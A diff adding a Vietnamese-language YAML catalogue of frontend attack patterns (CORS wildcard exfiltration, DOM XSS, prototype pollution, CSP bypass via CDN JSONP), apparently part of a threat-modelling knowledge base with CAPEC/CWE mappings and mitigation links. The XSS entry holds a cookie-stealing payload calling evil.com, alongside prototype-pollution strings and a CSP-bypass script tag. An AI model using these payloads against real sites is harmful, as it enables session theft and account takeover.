@@ -1,0 +1,57 @@
+pattern_id: ASRP-AP-FRONTEND-001
+name: Frontend Client-Side & CORS Misconfiguration Attack Patterns
+version: 2.0.0
+applicable_stack: [react, nextjs, typescript, cors, csp, frontend]
+
+attack_patterns:
+  - attack_id: ATK-CAPEC-180
+    capec_id: CAPEC-180
+    mitre_technique: T1189 (Drive-by Compromise / CORS Abuse)
+    name: Cross-Origin Data Exfiltration via CORS Wildcard Overriding
+    severity: HIGH
+    target_vulnerability: CWE-942 (Permissive Cross-Origin Resource Sharing Policy)
+    attack_vector: |
+      Bước 1: Attacker dụ nạn nhân truy cập vào trang web độc hại `https://evil.com`.
+      Bước 2: Trang `evil.com` chạy đoạn JavaScript gửi XMLHttpRequest tới API `https://api.clinic.com/v1/user/profile`.
+      Bước 3: Do API Controller gán thủ công `@Header('Access-Control-Allow-Origin', '*')` hoặc cấu hình `credentials: true` kèm wildcard origin, `evil.com` đọc được toàn bộ response chứa thông tin nhạy cảm của nạn nhân.
+    prerequisites: Controller `@Header('Access-Control-Allow-Origin', '*')` ghi đè CORS Whitelist toàn cục của Gateway/Middleware.
+    mitigation_refs: [SCG-NEST-008, THREAT-I-003, REM-003]
+
+  - attack_id: ATK-CAPEC-63
+    capec_id: CAPEC-63
+    mitre_technique: T1059.007 (JavaScript Execution / XSS)
+    name: DOM-Based Cross-Site Scripting via Unsanitized React/Next.js Props
+    severity: HIGH
+    target_vulnerability: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+    attack_vector: |
+      Bước 1: Attacker truyền mã độc JavaScript `<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>` vào tham số URL hoặc ô nhập liệu.
+      Bước 2: Frontend Component trong Next.js render trực tiếp thuộc tính dữ liệu này vào `dangerouslySetInnerHTML` hoặc `href="javascript:..."`.
+      Bước 3: Trình duyệt nạn nhân tự động thực thi script độc hại trong ngữ cảnh Origin của ứng dụng web.
+    prerequisites: Lập trình viên sử dụng `dangerouslySetInnerHTML` mà không qua thư viện làm sạch DOMPurify.
+    mitigation_refs: [SCG-REACT-001, SCG-REACT-004, REM-005]
+
+  - attack_id: ATK-CAPEC-63-PROTO
+    capec_id: CAPEC-63
+    mitre_technique: T1059.007 (JavaScript Execution / Prototype Pollution)
+    name: Client-Side Prototype Pollution via Recursive Object Merge
+    severity: HIGH
+    target_vulnerability: CWE-1321 (Improper Globally-Scoped Variable Modification)
+    attack_vector: |
+      Bước 1: Attacker chèn chuỗi JSON có thuộc tính `__proto__.polluted = true` hoặc `constructor.prototype.isAdmin = true` vào URL query parameter.
+      Bước 2: Thư viện util gộp object (như lodash `merge` phiên bản cũ hoặc hàm custom deep merge) gán thuộc tính độc hại vào `Object.prototype`.
+      Bước 3: Mọi Object trong ứng dụng Frontend kế thừa thuộc tính `polluted`, làm thay đổi luồng logic hiển thị UI hoặc kích hoạt XSS gadgets.
+    prerequisites: Ứng dụng Frontend thực hiện deep merge JSON object từ user input mà thiếu sanitization các key `__proto__`, `constructor`, `prototype`.
+    mitigation_refs: [SCG-REACT-004, THREAT-I-003, REM-005]
+
+  - attack_id: ATK-CAPEC-180-CSP
+    capec_id: CAPEC-180
+    mitre_technique: T1189 (Drive-by Compromise / CSP Bypass)
+    name: Content Security Policy (CSP) Bypass via Trusted CDN JSONP Endpoints
+    severity: MEDIUM
+    target_vulnerability: CWE-693 (Protection Mechanism Failure)
+    attack_vector: |
+      Bước 1: Attacker phát hiện ứng dụng triển khai CSP Header `script-src 'self' https://cdnjs.cloudflare.com`.
+      Bước 2: Attacker tìm thấy một JSONP endpoint hoặc thư viện vulnerable được host trên CDN trusted domain.
+      Bước 3: Attacker chèn thẻ `<script src="https://cdnjs.cloudflare.com/.../angular.js?callback=alert(1)">` vượt qua cơ chế kiểm tra CSP để thực thi mã độc.
+    prerequisites: CSP Header sử dụng wildcard CDN domain thay vì Nounce-based hoặc Hash-based CSP.
+    mitigation_refs: [SCG-REACT-004, THREAT-I-003, REM-003]
